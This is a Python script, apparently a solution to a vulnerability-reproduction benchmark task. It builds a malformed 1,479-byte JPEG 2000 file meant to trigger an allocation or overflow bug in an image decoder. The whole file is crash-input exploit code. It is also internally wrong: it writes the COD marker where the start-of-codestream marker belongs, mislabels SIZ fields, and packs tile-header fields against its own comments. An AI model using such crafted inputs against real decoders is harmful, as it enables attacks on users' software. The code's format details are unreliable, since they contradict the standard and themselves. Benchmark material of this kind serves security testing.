import struct

class Solution:
    def solve(self, src_path: str) -> bytes:
        poc = bytearray()
        # Minimal JPEG 2000 structure to potentially trigger allocation issues
        # SOC marker
        poc.extend(struct.pack('>H', 0xff52))
        # SIZ marker - set large sizes to trigger potential size miscalculation
        siz_len = 47
        poc.extend(struct.pack('>H', 0xff51))
        poc.extend(struct.pack('>H', siz_len))
        # Isot
        poc.extend(struct.pack('>I', 0x00000000))
        # Xsiz, Ysiz - large to cause issues
        poc.extend(struct.pack('>I', 0x00010000))  # 65536
        poc.extend(struct.pack('>I', 0x00010000))
        poc.extend(struct.pack('>I', 0x00000000))  # XOsiz, YOsiz
        poc.extend(struct.pack('>I', 0x00000000))
        # XTsiz, YTsiz - small tiles
        poc.extend(struct.pack('>I', 0x00000040))  # 64
        poc.extend(struct.pack('>I', 0x00000040))
        poc.extend(struct.pack('>I', 0x00000000))  # XTOsiz, YTOsiz
        poc.extend(struct.pack('>I', 0x00000000))
        # Csiz = 1
        poc.extend(struct.pack('>H', 0x0001))
        # Component: 8-bit grayscale
        poc.extend(struct.pack('>BBBB', 0x07, 0x01, 0x01, 0x00))  # Ssiz=7 (8-bit), XRsiz=1, YRsiz=1, approx=0
        # COD marker
        poc.extend(struct.pack('>H', 0xff52))
        cod_len = 14
        poc.extend(struct.pack('>H', cod_len))
        # Scod = 0x02 (random access), Nlayers=1, Mcod=0 (no multiple tiles), etc.
        poc.extend(b'\x02\x01\x00\x00\x00\x00\x00')  # Basic COD params
        # Add some tile data or packets to reach tier-1
        # SOT marker
        poc.extend(struct.pack('>H', 0xff90))
        sot_len = 10
        poc.extend(struct.pack('>H', sot_len))
        poc.extend(struct.pack('>HBBH', 0x0000, 0x00, 0x01, 0x0000))  # Isot=0, Psot=0, TPsot=0, TNsot=1
        # SOD marker
        poc.extend(struct.pack('>H', 0xff93))
        # Dummy packet header and data to trigger decoding
        # This is minimal; in practice, adjust to hit the exact alloc bug
        # Pad to approach 1479 bytes with junk data that might cause overflow in processing
        remaining = 1479 - len(poc)
        if remaining > 0:
            poc.extend(b'\x00' * remaining)
        return bytes(poc[:1479])  # Ensure exactly 1479 bytes
